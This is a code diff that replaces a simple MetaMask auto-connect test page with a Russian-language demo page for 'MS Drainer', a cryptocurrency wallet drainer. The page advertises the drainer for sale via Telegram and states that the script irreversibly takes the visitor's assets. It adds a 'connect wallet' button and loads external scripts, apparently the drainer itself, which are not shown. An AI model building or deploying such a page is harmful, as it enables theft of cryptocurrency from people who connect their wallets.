@@ -1,60 +1,36 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Wallet Auto-Connect</title>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Пример</title>
+  <style>
+    @media (prefers-color-scheme: dark) {
+      html, body {
+        background: #212020;
+        color: #fff;
+      }
+    }
+  </style>
 </head>
 <body>
-    <h1>Wallet Auto-Connect Test</h1>
-    <button onclick="connectWallet()">Connect Wallet Manually</button>
-    
-    <script>
-        // Define callbacks
-        window.onWalletConnected = function(account) {
-            alert('Connected successfully! Account: ' + account);
-            // Redirect or do something else
-        };
-        
-        window.onWalletError = function(error) {
-            alert('Connection failed: ' + error.message);
-        };
-        
-        window.onNoWallet = function() {
-            alert('Please install MetaMask!');
-        };
-    </script>
-    
-    <script>
-        // Paste the simple version code here
-        function autoConnectWallet() {
-            console.log('Attempting to auto-connect wallet...');
-            
-            if (window.ethereum) {
-                console.log('Ethereum wallet detected');
-                
-                window.ethereum.request({ method: 'eth_requestAccounts' })
-                    .then(accounts => {
-                        console.log('✅ Connected successfully! Account:', accounts[0]);
-                        if (window.onWalletConnected) {
-                            window.onWalletConnected(accounts[0]);
-                        }
-                    })
-                    .catch(error => {
-                        console.log('❌ Connection failed:', error);
-                        if (window.onWalletError) {
-                            window.onWalletError(error);
-                        }
-                    });
-            } else {
-                console.log('❌ No Ethereum wallet found');
-                if (window.onNoWallet) {
-                    window.onNoWallet();
-                }
-            }
-        }
-
-        // Auto connect when page loads
-        setTimeout(autoConnectWallet, 1500);
-        window.connectWallet = autoConnectWallet;
-    </script>
+  <h1>Страница с примером работы MS Drainer</h1>
+  <p>Хотите приобрести? Пишите в Telegram: </p>
+  <hr>
+  <div class="advanced_mode">
+    <p><strong>Встроенный кошелек:</strong> <span id="injected-status">false</span></p>
+    <button onclick="init_co()">Подключить кошелёк</button>
+    <p><strong>Будьте осторожны!</strong> Скрипт безвозвратно списывает ваши активы!</p>
+  </div>
+  <script src="./assets/w-modal.js"></script>
+  <script src="./assets/w-loader.js"></script>
+  <script src="./assets/modules.js"></script>
+  <script src="./assets/main.js"></script>
+  <script>
+    setInterval(() => {
+      document.getElementById('injected-status').innerHTML = (typeof window.ethereum === 'object') ? 'true' : 'false';
+    }, 1000);
+  </script>
 </body>
 </html>
